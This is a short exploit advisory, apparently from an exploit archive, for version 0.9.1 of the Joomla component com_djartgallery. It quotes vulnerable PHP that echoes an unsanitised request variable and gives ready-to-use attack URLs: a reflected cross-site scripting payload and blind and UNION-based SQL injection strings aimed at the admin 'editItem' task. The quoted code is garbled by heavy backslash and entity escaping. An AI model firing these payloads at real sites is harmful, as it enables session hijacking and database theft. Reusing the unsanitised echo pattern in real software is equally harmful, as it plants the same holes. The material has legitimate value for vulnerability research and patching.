#Exploit Title:     Joomla Component com_djartgallery Multiple Vulnerabilities
#Date:          04/06/2010
#Author:        Tomasz Kowalski
 
#Software Link:     http://www.design-joomla.eu/downloads/download/components/dj-artgallery.html
 
#Version:       0.9.1
#Tested on:     Linux ubuntu32 2.6.32-22-generic x64
 
#Summary:
     
[+] Cross Site Scripting on administrator/components/com_djartgallery/views/editimage/tmpl/default.php:
 
    We can fond this code on line 183:
    ...
    <input type=\\\\\\\"hidden\\\\\\\" name=\\\\\\\"id\\\\\\\" value=\\\\\\\"<?php echo JRequest::getVar(\\\\\\\&#039;id\\\\\\\&#039;); ?>\\\\\\\" />
    <input type=\\\\\\\"hidden\\\\\\\" name=\\\\\\\"option\\\\\\\" value=\\\\\\\"com_djartgallery\\\\\\\" />
    <input type=\\\\\\\"hidden\\\\\\\" name=\\\\\\\"task\\\\\\\" value=\\\\\\\"editImage\\\\\\\" />
    ...
 
    You must see it }x)    
 
    <input type=\\\\\\\"hidden\\\\\\\" name=\\\\\\\"id\\\\\\\" value=\\\\\\\"<?php echo JRequest::getVar(\\\\\\\&#039;id\\\\\\\&#039;); ?>\\\\\\\" />
 
    Method to exploit this could be next code injection:
     
    http://localhost/joomla/administrator/index.php?option=com_djartgallery&task=editItem
    &cid[]=%22%3E%3C/form%3E%3CSCRIPT%3Ealert%28%22XSS%20by%20r0i%22%29;%3C/script%3E
 
[+]Blind SQL Injection
 
    Also we can extract it databases information through Blind SQL Injection, on same parameter, how to we will see on next code:
administrator/components/com_djartgallery/controller.php, line 382:
 
    $link = \\\\\\\&#039;index.php?option=com_djartgallery&task=com_djartgallery&task=editItem&cid[]=\\\\\\\&#039;.JRequest::getVar(\\\\\\\&#039;id\\\\\\\&#039;);
 
    To exploit it:
     
    http://victim/administrator/index.php?option=com_djartgallery&task=editItem
    &cid[]=1\\\\\\\&#039;+and+1=1+--+
 
    Field \\\\\\\&#039;Select Article\\\\\\\&#039; its changed when reply its true/false; but too its likely that run UNION injection:
 
    http://victim/administrator/index.php?option=com_djartgallery&task=editItem
    &cid[]=-1%27/*!UNION%20SELECT%20@@version,2,3,4,5,6,7,8,9,10,11,12,13,14,15,16,17,18,19,20,21,22,23,24,25*/+--+
